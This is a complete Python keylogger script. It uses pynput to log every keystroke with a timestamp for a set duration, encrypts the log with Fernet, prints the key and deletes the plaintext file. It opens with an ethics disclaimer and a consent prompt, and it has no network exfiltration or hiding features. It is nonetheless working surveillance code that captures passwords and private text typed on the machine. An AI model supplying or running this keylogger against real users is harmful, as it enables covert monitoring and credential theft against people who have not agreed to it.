import pynput
import time
import os
import sys
from cryptography.fernet import Fernet

# Defines the log file paths
log_file_path = "keylogger_log.txt"
encrypted_log_file_path = "keylogger_log_encrypted.txt"

# Keylogger function to record key presses
def keylogger(key):
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
    try:
        event = f"{timestamp} - {key.char}\n"
    except AttributeError:
        event = f"{timestamp} - {key}\n"

    # Write the event to the log file
    try:
        with open(log_file_path, "a") as log_file:
            log_file.write(event)
    except IOError:
        print("Error writing to log file.")
        sys.exit()

# Encryption function using Fernet symmetric encryption
def generate_key():
    return Fernet.generate_key()

def encrypt_log_file(key):
    try:
        fernet = Fernet(key)
        with open(log_file_path, "rb") as file:
            log_data = file.read()
        encrypted_data = fernet.encrypt(log_data)
        with open(encrypted_log_file_path, "wb") as encrypted_file:
            encrypted_file.write(encrypted_data)
        os.remove(log_file_path)  # Optionally delete original log file
        print(f"Log file encrypted and saved as {encrypted_log_file_path}")
    except Exception as e:
        print(f"Failed to encrypt log file: {e}")

# Main function to run the keylogger
def run_keylogger():
    # Prompts the user to enter the logging duration
    try:
        log_duration = int(input("Enter the duration (in seconds) for which the keystrokes should be logged: "))
    except ValueError:
        print("Invalid duration. Please enter a valid number.")
        sys.exit()

    # Generate a key for encryption
    encryption_key = generate_key()
    print(f"Encryption Key (save this!): {encryption_key.decode()}")

    # Set up the keylogger listener
    listener = pynput.keyboard.Listener(on_press=keylogger)
    listener.start()

    # Run the keylogger for the specified duration
    start_time = time.time()
    end_time = start_time + log_duration

    try:
        while time.time() < end_time:
            time.sleep(1)
    except KeyboardInterrupt:
        print("Keylogger interrupted.")
    finally:
        listener.stop()
        encrypt_log_file(encryption_key)

    print("Keylogger stopped.")

# Run the keylogger
if __name__ == "__main__":
    # Display the disclaimer and get user acceptance
    print("---------------- Keylogger Disclaimer ----------------")
    print("By using this program, you agree to use it ethically and only on systems you have permission to monitor.")
    
    accept_terms = input("Do you accept these terms and conditions? (y/n): ")
    
    if accept_terms.lower() != 'y':
        print("You must accept the terms and conditions before using this program.")
        sys.exit()

    run_keylogger()
